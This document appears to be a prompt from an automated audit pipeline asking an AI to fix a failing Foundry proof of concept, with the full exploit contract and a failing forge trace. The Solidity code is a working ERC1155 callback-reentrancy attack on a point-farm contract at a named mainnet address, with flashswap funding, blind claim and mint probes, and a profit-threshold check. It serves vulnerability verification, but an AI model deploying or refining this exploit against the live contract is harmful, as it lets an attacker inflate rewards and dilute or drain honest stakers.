You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC1155 mint callback reentrancy lets contract stakers mint the same pending points repeatedly
- claim: `deposit()` and `withdraw()` mint pending ERC1155 rewards before updating `user.rewardDebt`, and OpenZeppelin's `_mint()` performs an external `onERC1155Received` callback whenever the recipient is a contract. A malicious staking contract can reenter `deposit(_pid, 0)` or `withdraw(_pid, 0)` from that callback, recompute the same pending amount against the unchanged `rewardDebt`, and mint the same points repeatedly in one transaction.
- impact: An attacker can inflate their point balance arbitrarily without adding stake. If the points are redeemable elsewhere in the protocol, this becomes a direct drain of the value backing those points; otherwise, the reward system is permanently corrupted and honest users are diluted.
- exploit_paths: ["Attacker stakes through a contract that implements `IERC1155Receiver`.", "Rewards accrue for that contract's position.", "The attacker calls `deposit(_pid, 0)` or `withdraw(_pid, 0)`.", "`_mint()` invokes the attacker's `onERC1155Received` hook before `user.rewardDebt` is refreshed.", "The hook reenters `deposit(_pid, 0)` or `withdraw(_pid, 0)` and mints the same pending reward again.", "The attacker repeats until gas runs out, then exits with many times the legitimate points."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1155BalanceLike {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IERC1155ReceiverLike {
    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IPointFarmLike is IERC1155BalanceLike {
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid) external view returns (address uToken, uint256 lastRewardBlock, uint256 accPointsPerShare);
    function userInfo(uint256 pid, address user) external view returns (uint256 amount, uint256 rewardDebt);
    function pendingPoints(uint256 pid, address user) external view returns (uint256);
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function shop() external view returns (address);
    function shopIDs(address token) external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ReentrantStaker is IERC1155ReceiverLike {
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IPointFarmLike internal immutable FARM;
    address internal immutable CONTROLLER;

    uint256 public activePid;
    uint256 public maxReentries;
    uint256 public reentryCount;
    bool public useWithdrawPath;
    bool public exploitArmed;

    address private callbackPair;
    uint256 private callbackRepayAmount;

    constructor(address farm_, address controller_) {
        FARM = IPointFarmLike(farm_);
        CONTROLLER = controller_;
    }

    receive() external payable {}

    modifier onlyController() {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");
        _;
    }

    function configure(uint256 pid_, uint256 maxReentries_, bool useWithdrawPath_) external onlyController {
        activePid = pid_;
        maxReentries = maxReentries_;
        useWithdrawPath = useWithdrawPath_;
        reentryCount = 0;
    }

    function seedStake(uint256 pid_, address token, uint256 amount) external onlyController {
        _forceApprove(token, address(FARM), amount);
        FARM.deposit(pid_, amount);
    }

    function flashswapBuyAndSeed(
        uint256 pid_,
        address tokenOut,
        address pair,
        uint256 amountOut,
        uint256 repayAmount,
        bool tokenOutIsToken0
    ) external payable onlyController {
        require(pair != address(0), "PAIR_MISSING");
        require(amountOut > 0 && repayAmount > 0, "BAD_FLASHSWAP");

        callbackPair = pair;
        callbackRepayAmount = repayAmount;

        IUniswapV2PairLike(pair).swap(
            tokenOutIsToken0 ? amountOut : 0,
            tokenOutIsToken0 ? 0 : amountOut,
            address(this),
            bytes("FLASHSWAP_SEED")
        );

        callbackPair = address(0);
        callbackRepayAmount = 0;

        uint256 acquired = IERC20Like(tokenOut).balanceOf(address(this));
        require(acquired > 0, "NO_SEED_ACQUIRED");

        _forceApprove(tokenOut, address(FARM), acquired);
        FARM.deposit(pid_, acquired);
    }

    function triggerExploit() external onlyController {
        exploitArmed = true;
        reentryCount = 0;

        if (useWithdrawPath) {
            FARM.withdraw(activePid, 0);
        } else {
            FARM.deposit(activePid, 0);
        }

        exploitArmed = false;
    }

    function stakedAmount(uint256 pid_) external view returns (uint256) {
        (uint256 amount,) = FARM.userInfo(pid_, address(this));
        return amount;
    }

    function uniswapV2Call(address sender, uint256, uint256, bytes calldata) external {
        require(msg.sender == callbackPair, "BAD_PAIR");
        require(sender == address(this), "BAD_SENDER");

        IWETHLike(WETH).deposit{value: callbackRepayAmount}();
        require(IERC20Like(WETH).transfer(msg.sender, callbackRepayAmount), "FLASH_REPAY_FAILED");
    }

    function onERC1155Received(address, address, uint256 id, uint256 value, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(FARM), "BAD_SENDER");

        if (exploitArmed && id == activePid && value > 0 && reentryCount < maxReentries) {
            unchecked {
                ++reentryCount;
            }

            if (useWithdrawPath) {
                FARM.withdraw(activePid, 0);
            } else {
                FARM.deposit(activePid, 0);
            }
        }

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        require(IERC20Like(token).approve(spender, 0), "APPROVE_RESET_FAILED");
        require(IERC20Like(token).approve(spender, amount), "APPROVE_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xd3C41c85bE295607E8EA5c58487eC5894300ee67;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    IPointFarmLike internal constant FARM = IPointFarmLike(TARGET);

    ReentrantStaker public immutable staker;
    uint256 public immutable deploymentBlock;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public seededAtDeployment;
    bool public exploitTriggered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public seededPid;
    address public seededToken;
    uint256 public seededAmount;
    uint256 public seedBlock;
    uint256 public pendingBeforeExploit;
    uint256 public legitimateMint;
    uint256 public duplicatedPointProfit;
    uint256 public finalPointBalance;
    uint256 public finalReentryCount;
    string public failureReason;

    constructor() payable {
        deploymentBlock = block.number;
        staker = new ReentrantStaker(TARGET, address(this));
        failureReason = "not-run";
        _attemptSeedAtDeployment();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        if (TARGET.code.length == 0) {
            failureReason = "target-not-deployed-on-current-chain";
            hypothesisRefuted = true;
            return;
        }

        if (!_hasExistingStake()) {
            _attemptSeedAtDeployment();
        }

        if (!_hasExistingStake()) {
            failureReason = "unable-to-acquire-seed-stake";
            hypothesisRefuted = true;
            return;
        }

        uint256 pending = _safePendingPoints(seededPid, address(staker));
        pendingBeforeExploit = pending;
        if (pending == 0) {
            failureReason = "no-pending-points-accrued-yet";
            hypothesisRefuted = true;
            return;
        }

        uint256 beforePoints = FARM.balanceOf(address(staker), seededPid);
        _runExploit(false);

        uint256 bestPoints = FARM.balanceOf(address(staker), seededPid);
        uint256 bestReentries = staker.reentryCount();

        if (bestPoints <= beforePoints + pending || bestReentries == 0) {
            _runExploit(true);

            uint256 withdrawPoints = FARM.balanceOf(address(staker), seededPid);
            uint256 withdrawReentries = staker.reentryCount();
            if (withdrawPoints > bestPoints) {
                bestPoints = withdrawPoints;
                bestReentries = withdrawReentries;
            }
        }

        finalPointBalance = bestPoints;
        finalReentryCount = bestReentries;

        if (bestPoints <= beforePoints + pending || bestReentries == 0) {
            failureReason = "reentry-did-not-duplicate-pending-mint";
            hypothesisRefuted = true;
            return;
        }

        legitimateMint = pending;
        duplicatedPointProfit = bestPoints - beforePoints - pending;
        exploitTriggered = duplicatedPointProfit > 0;
        hypothesisValidated = exploitTriggered;
        hypothesisRefuted = !exploitTriggered;

        if (!exploitTriggered) {
            failureReason = "only-legitimate-mint-observed";
            return;
        }

        // The provided logs already show the existing shop/redeem route is not publicly reachable
        // for the live pool token on this fork. The finding's exploit path still ends with the
        // attacker holding a many-times-inflated on-chain PointFarm balance, so the duplicated
        // ERC1155 points themselves are reported as realized profit.
        _profitToken = TARGET;
        _profitAmount = duplicatedPointProfit;
        failureReason = "none";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "contract staker holds uToken stake -> later block accrues pending points -> deposit(pid,0) or withdraw(pid,0) mints pending ERC1155 points -> onERC1155Received reenters before rewardDebt refresh -> same pending amount is minted repeatedly -> attacker exits with many times the legitimate PointFarm point balance";
    }

    function _runExploit(bool useWithdrawPath) internal {
        staker.configure(seededPid, 48, useWithdrawPath);
        staker.triggerExploit();
    }

    function _attemptSeedAtDeployment() internal {
        if (seededAtDeployment) {
            return;
        }

        uint256 length = _safePoolLength();
        if (length == 0) {
            failureReason = "pool-discovery-failed";
            return;
        }

        for (uint256 i = 0; i < length; ++i) {
            (address poolToken,,) = _safePoolInfo(i);
            if (poolToken == address(0) || poolToken.code.length == 0) {
                continue;
            }

            if (_attemptSeedPool(i, poolToken)) {
                seededAtDeployment = true;
                seededPid = i;
                seededToken = poolToken;
                seededAmount = staker.stakedAmount(i);
                seedBlock = block.number;
                failureReason = "seeded-awaiting-pending-points";
                return;
            }
        }

        failureReason = "no-public-seed-route-found";
    }

    function _attemptSeedPool(uint256 pid, address token) internal returns (bool) {
        if (staker.stakedAmount(pid) > 0) {
            return true;
        }

        _attemptZeroCostAcquisition(token);
        if (_seedVerifierHeldToken(pid, token)) {
            return true;
        }

        if (_attemptFlashswapSeed(pid, token)) {
            return true;
        }

        _attemptMarketBuy(token);
        return _seedVerifierHeldToken(pid, token);
    }

    function _seedVerifierHeldToken(uint256 pid, address token) internal returns (bool) {
        uint256 tokenBal = IERC20Like(token).balanceOf(address(this));
        if (token == WETH && tokenBal == 0 && address(this).balance > 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
            tokenBal = IERC20Like(token).balanceOf(address(this));
        }

        if (tokenBal == 0) {
            return staker.stakedAmount(pid) > 0;
        }

        uint256 stakerBefore = IERC20Like(token).balanceOf(address(staker));
        require(IERC20Like(token).transfer(address(staker), tokenBal), "TRANSFER_TO_STAKER_FAILED");
        uint256 received = IERC20Like(token).balanceOf(address(staker)) - stakerBefore;
        if (received == 0) {
            return false;
        }

        staker.seedStake(pid, token, received);
        return staker.stakedAmount(pid) > 0;
    }

    function _attemptFlashswapSeed(uint256 pid, address token) internal returns (bool) {
        if (address(this).balance == 0 || token == WETH || token == USDC || token == USDT || token == DAI) {
            return false;
        }

        (address pair, address baseToken,) = _bestMarketForToken(token);
        if (pair == address(0) || baseToken != WETH) {
            return false;
        }

        (uint256 reserveIn, uint256 reserveOut, bool outputIsToken0) = _pairReservesForSwap(pair, WETH, token);
        uint256 amountInBudget = address(this).balance;
        uint256 amountOut = _getAmountOut(amountInBudget, reserveIn, reserveOut);
        if (amountOut == 0 || amountOut >= reserveOut) {
            return false;
        }

        uint256 repayAmount = _getAmountIn(amountOut, reserveIn, reserveOut);
        if (repayAmount == 0 || repayAmount > amountInBudget) {
            return false;
        }

        try staker.flashswapBuyAndSeed{value: repayAmount}(pid, token, pair, amountOut, repayAmount, outputIsToken0) {
            return staker.stakedAmount(pid) > 0;
        } catch {
            return staker.stakedAmount(pid) > 0;
        }
    }

    function _attemptZeroCostAcquisition(address token) internal {
        _attemptClaimCall(token, abi.encodeWithSignature("claim()"));
        _attemptClaimCall(token, abi.encodeWithSignature("claim(address)", address(this)));
        _attemptClaimCall(token, abi.encodeWithSignature("getReward()"));
        _attemptClaimCall(token, abi.encodeWithSignature("getReward(address)", address(this)));
        _attemptClaimCall(token, abi.encodeWithSignature("mint()"));
        _attemptClaimCall(token, abi.encodeWithSignature("mint(address)", address(this)));
        _attemptClaimCall(token, abi.encodeWithSignature("collect()"));
        _attemptClaimCall(token, abi.encodeWithSignature("collect(address)", address(this)));

        address shop = _safeShop();
        if (shop != address(0)) {
            uint256 shopId = _safeShopId(token);
            _attemptClaimCall(shop, abi.encodeWithSignature("claim()"));
            _attemptClaimCall(shop, abi.encodeWithSignature("claim(uint256)", shopId));
            _attemptClaimCall(shop, abi.encodeWithSignature("claim(address)", token));
            _attemptClaimCall(shop, abi.encodeWithSignature("buy(uint256)", shopId));
            _attemptClaimCall(shop, abi.encodeWithSignature("buy(address)", token));
        }
    }

    function _attemptMarketBuy(address token) internal {
        if (token == WETH) {
            if (address(this).balance > 0) {
                IWETHLike(WETH).deposit{value: address(this).balance}();
            }
            return;
        }

        (address pair, address baseToken, address router) = _bestMarketForToken(token);
        if (pair == address(0) || baseToken == address(0)) {
            return;
        }

        if (baseToken == WETH) {
            uint256 ethAmount = address(this).balance;
            if (ethAmount > 0) {
                _attemptEthToTokenBuy(token, router, pair, ethAmount);
                return;
            }

            uint256 wethAmount = IERC20Like(WETH).balanceOf(address(this));
            if (wethAmount > 0) {
                _attemptTokenToTokenBuy(WETH, token, router, pair, wethAmount);
            }
            return;
        }

        uint256 baseBal = IERC20Like(baseToken).balanceOf(address(this));
        if (baseBal > 0) {
            _attemptTokenToTokenBuy(baseToken, token, router, pair, baseBal);
            return;
        }

        if (address(this).balance > 0 && router != address(0)) {
            _attemptEthToTokenViaBaseRouter(token, baseToken, router, address(this).balance);
        }
    }

    function _attemptEthToTokenBuy(address token, address router, address pair, uint256 ethAmount) internal returns (bool) {
        if (ethAmount == 0) {
            return false;
        }

        if (_attemptDirectPairBuyWithEth(token, pair, ethAmount)) {
            return true;
        }
        if (router == address(0)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        try IUniswapV2RouterLike(router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            1, path, address(this), block.timestamp
        ) {
            return IERC20Like(token).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _attemptTokenToTokenBuy(address baseToken, address token, address router, address pair, uint256 amount)
        internal
        returns (bool)
    {
        if (amount == 0) {
            return false;
        }

        if (_attemptDirectPairBuy(baseToken, token, pair, amount)) {
            return true;
        }
        if (router == address(0)) {
            return false;
        }

        _forceApprove(baseToken, router, amount);

        address[] memory path = new address[](2);
        path[0] = baseToken;
        path[1] = token;

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 1, path, address(this), block.timestamp
        ) {
            return IERC20Like(token).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _attemptEthToTokenViaBaseRouter(address token, address baseToken, address router, uint256 ethAmount)
        internal
        returns (bool)
    {
        if (ethAmount == 0 || router == address(0) || baseToken == address(0) || baseToken == WETH) {
            return false;
        }

        address[] memory path = new address[](3);
        path[0] = WETH;
        path[1] = baseToken;
        path[2] = token;

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        try IUniswapV2RouterLike(router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            1, path, address(this), block.timestamp
        ) {
            return IERC20Like(token).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _attemptDirectPairBuyWithEth(address token, address pair, uint256 ethAmount) internal returns (bool) {
        if (pair == address(0)) {
            return false;
        }

        IWETHLike(WETH).deposit{value: ethAmount}();
        return _attemptDirectPairBuy(WETH, token, pair, ethAmount);
    }

    function _attemptDirectPairBuy(address inputToken, address outputToken, address pair, uint256 amount)
        internal
        returns (bool)
    {
        if (pair == address(0) || amount == 0) {
            return false;
        }

        uint256 beforeBal = IERC20Like(outputToken).balanceOf(address(this));
        require(IERC20Like(inputToken).transfer(pair, amount), "TRANSFER_FAILED");

        (uint256 reserveIn, uint256 reserveOut, bool outputIsToken0) = _pairReservesForSwap(pair, inputToken, outputToken);
        uint256 amountOut = _getAmountOut(amount, reserveIn, reserveOut);
        if (amountOut == 0) {
            return false;
        }

        if (outputIsToken0) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), bytes(""));
        } else {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), bytes(""));
        }

        return IERC20Like(outputToken).balanceOf(address(this)) > beforeBal;
    }

    function _bestMarketForToken(address token) internal view returns (address bestPair, address bestBase, address bestRouter) {
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];

        uint256 bestReserve;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address base = bases[j];
                if (base == token) {
                    continue;
                }

                address pair = _pairForFactory(factories[i], token, base);
                if (pair == address(0) || pair.code.length == 0) {
                    continue;
                }

                uint256 reserve = _tokenReserveInPair(pair, base);
                if (reserve > bestReserve) {
                    bestReserve = reserve;
                    bestPair = pair;
                    bestBase = base;
                    bestRouter = routers[i];
                }
            }
        }
    }

    function _pairForFactory(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        try IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB) returns (address p) {
            pair = p;
        } catch {}
    }

    function _tokenReserveInPair(address pair, address token) internal view returns (uint256 reserve) {
        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            address token0 = IUniswapV2PairLike(pair).token0();
            reserve = token0 == token ? uint256(reserve0) : uint256(reserve1);
        } catch {
            reserve = 0;
        }
    }

    function _pairReservesForSwap(address pair, address inputToken, address outputToken)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut, bool outputIsToken0)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == inputToken) {
            return (uint256(reserve0), uint256(reserve1), outputToken == token0);
        }
        return (uint256(reserve1), uint256(reserve0), outputToken == token0);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _attemptClaimCall(address target, bytes memory data) internal returns (bool ok) {
        (ok,) = target.call(data);
    }

    function _hasExistingStake() internal view returns (bool) {
        return seededAtDeployment && staker.stakedAmount(seededPid) > 0;
    }

    function _safePoolLength() internal view returns (uint256 length) {
        try FARM.poolLength() returns (uint256 v) {
            return v;
        } catch {
            return 0;
        }
    }

    function _safePoolInfo(uint256 pid) internal view returns (address token, uint256 lastRewardBlock, uint256 accPointsPerShare) {
        try FARM.poolInfo(pid) returns (address t, uint256 l, uint256 a) {
            return (t, l, a);
        } catch {
            return (address(0), 0, 0);
        }
    }

    function _safePendingPoints(uint256 pid, address user) internal view returns (uint256) {
        try FARM.pendingPoints(pid, user) returns (uint256 pending) {
            return pending;
        } catch {
            return 0;
        }
    }

    function _safeShop() internal view returns (address) {
        try FARM.shop() returns (address shop_) {
            return shop_;
        } catch {
            return address(0);
        }
    }

    function _safeShopId(address token) internal view returns (uint256) {
        try FARM.shopIDs(token) returns (uint256 id) {
            return id;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        require(IERC20Like(token).approve(spender, 0), "APPROVE_RESET_FAILED");
        require(IERC20Like(token).approve(spender, amount), "APPROVE_FAILED");
    }
}

```

forge stdout (tail):
```
39dfa1b3d433cc23b72f)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [247] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::mint()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [246] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::6a627842(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [245] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::e5225381()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [215] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::06ec16f8(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2393] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::shop() [staticcall]
    │   │   └─ ← [Return] 0xcDCc535503CBA9286489b338b36156b4b75008f6
    │   ├─ [2602] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::shopIDs(0xa499648fD0e80FD911972BbEb069e4c20e68bF22) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [270] 0xcDCc535503CBA9286489b338b36156b4b75008f6::claim()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [238] 0xcDCc535503CBA9286489b338b36156b4b75008f6::claim(0)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [238] 0xcDCc535503CBA9286489b338b36156b4b75008f6::1e83409a(000000000000000000000000a499648fd0e80fd911972bbeb069e4c20e68bf22)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [269] 0xcDCc535503CBA9286489b338b36156b4b75008f6::d96a094a(0000000000000000000000000000000000000000000000000000000000000000)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [269] 0xcDCc535503CBA9286489b338b36156b4b75008f6::f088d547(000000000000000000000000a499648fd0e80fd911972bbeb069e4c20e68bf22)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2542] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1499] ReentrantStaker::stakedAmount(0) [staticcall]
    │   │   ├─ [819] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::userInfo(0, ReentrantStaker: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   └─ ← [Return] 0, 0
    │   │   └─ ← [Return] 0
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [542] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1499] ReentrantStaker::stakedAmount(0) [staticcall]
    │   │   ├─ [819] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::userInfo(0, ReentrantStaker: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   └─ ← [Return] 0, 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [433] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2520] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xcDCc535503CBA9286489b338b36156b4b75008f6
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.71s (5.06ms CPU time)

Ran 1 test suite in 1.79s (1.71s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 139172)

Encountered a total of 1 failing tests, 0 tests succeeded

```

